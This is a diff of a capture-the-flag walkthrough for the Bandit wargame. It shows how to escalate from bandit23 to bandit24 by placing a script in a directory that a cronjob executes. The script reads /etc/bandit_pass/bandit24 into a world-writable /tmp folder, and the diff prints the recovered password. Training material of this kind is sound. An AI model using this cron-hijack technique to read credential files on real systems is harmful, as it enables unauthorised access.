@@ -72,19 +72,43 @@ Let's break-down this code line-by-line
 
 This is a very interesting discovery as we now know that any script file created by the user `bandit23` (that's us) in the folder `/var/spool/bandit24/foo` will be executed once every minute by this cronjob and what's more - it will be executed as the user `bandit24`!
 
-Now it's just a matter of taking what we learnt in the previous two tasks and putting it together to build our own script.  We can create our script file using `touch` and then use `nano` as our text editor to write the script:
+Now it's just a matter of taking what we learnt in the previous two tasks and putting it together to build our own script.  It's also important to keep in mind what user will be runnign this script and what file permissions each user has.
 
+Let's start by creating a temporary directory we can work in using `mkdir` and creating two files inside called `gimmepass.sh` (which will be our script file) and `password` which will be our output file.
 ```console
-bandit23@bandit:~$ touch /var/spool/bandit24/foo/gimmepass.sh
-bandit23@bandit:~$ nano /var/spool/bandit24/foo/gimmepass.sh
+bandit23@bandit:~$ mkdir /tmp/gimmepass
+bandit23@bandit:~$ cd /tmp/gimmepass
+bandit23@bandit:/tmp/gimmepass$ touch password
+bandit23@bandit:/tmp/gimmepass$ touch gimmepass.sh
 ```
 
+Now we can use `nano` as our text editor to edit the script file
+
+```console
+bandit23@bandit:/tmp/gimmepass$ nano gimmepass.sh
+```
+
+The bash script itself is a simple one-line script that takes the contents of `/etc/bandit_pass/bandit24` and outputs them to the `password` file we created earlier.
 ```bash
 #!/bin/bash
+cat /etc/bandit_pass/bandit24 > /tmp/gimmepass/password
+```
 
-echo "Here is the password for bandit24:"
-cat /etc/bandit_pass/bandit24
-echo "You're Welcome!"
+Now, keep in mind that `gimmepass.sh` and `password` as well as the whole `/tmp/gimmepass` directory was created by our user; `bandit23`.  On the other hand, the cronjob will be run by user `bandit24` which doesn't have write permissions to this directory.  We can fix this by granting write permissions to this directory and its contents to all the users using the `chmod` command:
+
+```console
+bandit23@bandit:/tmp/gimmepass$ chmod 777 -R /tmp/gimmepass
+```
+
+Now we just have to wait a minute or two until the next scheduled cronjob runs and executes our script.  We can keep looking inside the `password` file until it is updated with the password for `bandit24`:
+
+```console
+bandit23@bandit:/tmp/gimmepass$ cat password
+bandit23@bandit:/tmp/gimmepass$ cat password
+bandit23@bandit:/tmp/gimmepass$ cat password
+bandit23@bandit:/tmp/gimmepass$ cat password
+bandit23@bandit:/tmp/gimmepass$ cat password
+VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
 ```
 
 
